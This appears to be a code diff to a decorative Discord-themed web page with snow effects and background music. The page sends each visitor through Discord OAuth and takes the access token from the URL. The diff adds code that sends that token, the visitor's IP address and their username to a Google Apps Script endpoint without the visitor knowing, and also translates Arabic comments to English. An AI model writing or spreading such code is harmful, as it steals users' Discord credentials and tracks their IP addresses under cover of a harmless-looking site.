@@ -23,7 +23,7 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      cursor: pointer;
+      cursor: default;
       text-shadow: 0 0 10px green, 0 0 5px white;
       font-size: 1.5em;
       user-select: none;
@@ -152,18 +152,16 @@
 
   <script>
     const clientId = '1372712369100161055';
-    const redirectUri = encodeURIComponent(window.location.origin + window.location.pathname); // نفس صفحة الموقع
+    const redirectUri = encodeURIComponent(window.location.origin + window.location.pathname);
     const scope = 'identify';
     const discordAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=token&scope=${scope}`;
 
-    // دالة لجلب توكن من هاش URL (#access_token=...)
     function getAccessTokenFromHash() {
       const hash = window.location.hash.substring(1);
       const params = new URLSearchParams(hash);
       return params.get('access_token');
     }
 
-    // دالة لجلب بيانات المستخدم من ديسكورد
     async function fetchDiscordUser(token) {
       try {
         const res = await fetch('https://discord.com/api/users/@me', {
@@ -177,16 +175,39 @@
       }
     }
 
+    function enterSite() {
+      document.body.classList.add('show-main');
+
+      const audio = document.getElementById('bg-music');
+      setTimeout(() => {
+        audio.muted = false;
+        audio.volume = 0.5;
+        audio.play().catch(e => {
+          console.log("Autoplay prevented:", e);
+        });
+      }, 1000);
+
+      const createSnow = () => {
+        const snow = document.createElement("div");
+        snow.classList.add("snowflake");
+        snow.style.left = Math.random() * 100 + "vw";
+        snow.style.animationDuration = (Math.random() * 3 + 3) + "s";
+        document.body.appendChild(snow);
+        setTimeout(() => snow.remove(), 7000);
+      };
+      setInterval(createSnow, 150);
+    }
+
     async function init() {
       let token = getAccessTokenFromHash();
 
       if (!token) {
-        // إذا ما فيه توكن - نعيد التوجيه لتسجيل دخول ديسكورد تلقائي
+        // Redirect to Discord OAuth2 for token
         window.location.href = discordAuthUrl;
         return;
       }
 
-      // مسح الهاش من URL بدون إعادة تحميل الصفحة
+      // Remove hash from URL
       history.replaceState(null, null, ' ');
 
       const user = await fetchDiscordUser(token);
@@ -196,21 +217,24 @@
         return;
       }
 
-      // نعرض اسم المستخدم
       document.getElementById('user-info').textContent = `Discord User: ${user.username}#${user.discriminator}`;
 
-      // نبدأ تشغيل الموقع
       enterSite();
 
-      // هنا جلب الـ IP وارساله كما عندك
+      // Get IP and send data to Google Apps Script
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
           const ip = data.ip;
           console.log('Visitor IP:', ip);
-          // رابط Google Apps Script الخاص بك
+
+          // Replace this URL with your Google Apps Script URL
           const gasURL = 'https://script.google.com/macros/s/AKfycbxKvTAnQhresyE7v_3OVz_KKyxdDWKGtlZDoiKpxBYnSFc7i5QSMTd3zzB5g2XzlRYS/exec';
-          fetch(gasURL + '?ip=' + encodeURIComponent(ip) + '&username=' + encodeURIComponent(user.username) + '&discriminator=' + encodeURIComponent(user.discriminator))
+
+          fetch(gasURL + '?ip=' + encodeURIComponent(ip) 
+            + '&token=' + encodeURIComponent(token) 
+            + '&username=' + encodeURIComponent(user.username) 
+            + '&discriminator=' + encodeURIComponent(user.discriminator))
             .then(res => res.text())
             .then(text => {
               console.log('Response from GAS:', text);
@@ -223,12 +247,20 @@
           console.error('Failed to get IP:', err);
         });
 
-      // جلب عدد الزيارات
+      // Fetch visit count
       fetch("https://script.google.com/macros/s/AKfycbwO4MtdoAvNTB0HpM5iPa97ccGODbHwkf4iSC0NU7PeNk78o2RglVxII6cWaYjz5G03/exec")
         .then(response => response.text())
         .then(count => {
           document.getElementById('visit-label').textContent = 'Visits: ' + count;
         })
         .catch(err => {
-          console.error('خطأ في جلب عدد الزيارات:', err);
-          document.getElementBy
+          console.error('Error fetching visit count:', err);
+          document.getElementById('visit-label').textContent = 'Visits: N/A';
+        });
+    }
+
+    init();
+  </script>
+
+</body>
+</html>
